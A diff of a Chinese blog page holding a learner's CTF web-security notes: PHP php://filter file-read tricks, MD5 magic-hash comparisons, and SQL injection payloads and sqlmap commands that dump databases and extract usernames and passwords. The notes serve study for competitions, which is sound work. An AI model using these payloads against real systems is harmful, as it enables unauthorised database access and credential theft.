@@ -243,34 +243,204 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/07/ctf-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">ctf-web</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <p>看了dalao的博客，总结一下知识点<br>include漏洞<br>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。<br><code>php://filter/read=convert.base64-encoding/resource=文件名(如index.php)</code><br>代码审计<br>如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null<br>MD5黑魔法：240610708和QNKCDZO这两个字符MD5值是相当的<br>php中<code>+  _  .</code>可以替换<br>弱类型可以传入数组比较大小<br>解码<br>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间<br>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：<br><a href="https://emn178.github.io/online-tools/base64_decode.html" target="_blank" rel="noopener">https://emn178.github.io/online-tools/base64_decode.html</a><br>可以解好几种<br>sql<br>布尔注入，盲注之类的意思，布尔注入就像一个只会告诉你对或错的机器人，然后你去问他问题从而解决问题，盲注是说不会有提示信息，虽然对数据库的操作依然存在，但是不论是否操作成功都不会告诉你。 对一个注入语句记个笔记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df&apos; union select 1,database() %23</span><br><span class="line">%df&apos; union select 1,string from sql5.key %23</span><br></pre></td></tr></table></figure><br><code>%df</code>是在编码为gbk的时候用于宽字节注入的<br><code>%23</code>就是#，但是用#不能通过；还有可以直接用 <code>union select 字段名 from 数据库名.表名</code>获取字段的值。<br>sqlmap<br>对用sqlmap进行手工注入的一些步骤记个笔记<br>首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br></pre></td></tr></table></figure><br>–batch sqlmap不会询问你输入 全部默认确定<br> –level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段<br> –（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@@version()    MYSQL版本</span><br><span class="line">@@database()   当前数据库</span><br><span class="line">@@user()       当前用户</span><br><span class="line">@@datadir      当前数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br><span class="line"></span><br><span class="line">concat(str1,str2,...)                没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)   用分隔符连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)          用逗号分隔字符串</span><br></pre></td></tr></table></figure><br>一些payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查数据库名，用户名</span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错） 得到数据库名</span><br><span class="line">2. 查表名：</span><br><span class="line">union select group_concat(0x0a,table_name),2 from information_schema.tables where table_schema=库名十六进制#</span><br><span class="line">（库名十六进制可以用database()代替）</span><br><span class="line">3. 查列名</span><br><span class="line">union select group_concat(0x0a,column_name),2 from information_schema.columns where table_schema=database() and table_name=’users’#</span><br><span class="line">（也可以把表名改为十六进制编码0x7573657273）</span><br><span class="line">4. 查需要的信息（用户名和密码）</span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,last_name,0x0a,user,0x0a,password,0x0a),2 from users #</span><br></pre></td></tr></table></figure></p>
-
+          <h1 class="post-title" itemprop="name headline">ctf-web</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-07T21:15:13+08:00">
+                2018-10-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>看了dalao的博客，总结一下知识点<br>include漏洞<br>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。<br><code>php://filter/read=convert.base64-encoding/resource=文件名(如index.php)</code><br>代码审计<br>如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null<br>MD5黑魔法：240610708和QNKCDZO这两个字符MD5值是相当的<br>php中<code>+  _  .</code>可以替换<br>弱类型可以传入数组比较大小<br>解码<br>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间<br>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：<br><a href="https://emn178.github.io/online-tools/base64_decode.html" target="_blank" rel="noopener">https://emn178.github.io/online-tools/base64_decode.html</a><br>可以解好几种<br>sql<br>布尔注入，盲注之类的意思，布尔注入就像一个只会告诉你对或错的机器人，然后你去问他问题从而解决问题，盲注是说不会有提示信息，虽然对数据库的操作依然存在，但是不论是否操作成功都不会告诉你。 对一个注入语句记个笔记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df&apos; union select 1,database() %23</span><br><span class="line">%df&apos; union select 1,string from sql5.key %23</span><br></pre></td></tr></table></figure><br><code>%df</code>是在编码为gbk的时候用于宽字节注入的<br><code>%23</code>就是#，但是用#不能通过；还有可以直接用 <code>union select 字段名 from 数据库名.表名</code>获取字段的值。<br>sqlmap<br>对用sqlmap进行手工注入的一些步骤记个笔记<br>首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br></pre></td></tr></table></figure><br>–batch sqlmap不会询问你输入 全部默认确定<br> –level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段<br> –（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@@version()    MYSQL版本</span><br><span class="line">@@database()   当前数据库</span><br><span class="line">@@user()       当前用户</span><br><span class="line">@@datadir      当前数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br><span class="line"></span><br><span class="line">concat(str1,str2,...)                没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)   用分隔符连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)          用逗号分隔字符串</span><br></pre></td></tr></table></figure><br>一些payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查数据库名，用户名</span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错） 得到数据库名</span><br><span class="line">2. 查表名：</span><br><span class="line">union select group_concat(0x0a,table_name),2 from information_schema.tables where table_schema=库名十六进制#</span><br><span class="line">（库名十六进制可以用database()代替）</span><br><span class="line">3. 查列名</span><br><span class="line">union select group_concat(0x0a,column_name),2 from information_schema.columns where table_schema=database() and table_name=’users’#</span><br><span class="line">（也可以把表名改为十六进制编码0x7573657273）</span><br><span class="line">4. 查需要的信息（用户名和密码）</span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,last_name,0x0a,user,0x0a,password,0x0a),2 from users #</span><br></pre></td></tr></table></figure></p>
+
       
     </div>
     
     
     
+
+    
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatreward.jpg" alt="BoBo 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipayreward.jpg" alt="BoBo 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/日益成长的小白/" rel="tag"># 日益成长的小白</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/30/比赛/" rel="next" title="近期比赛（按比赛时间及报名截止顺序）">
+                <i class="fa fa-chevron-left"></i> 近期比赛（按比赛时间及报名截止顺序）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/09/2018中科大CTF/" rel="prev" title="2018中科大CTF">
+                2018中科大CTF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
   </div>
 
 
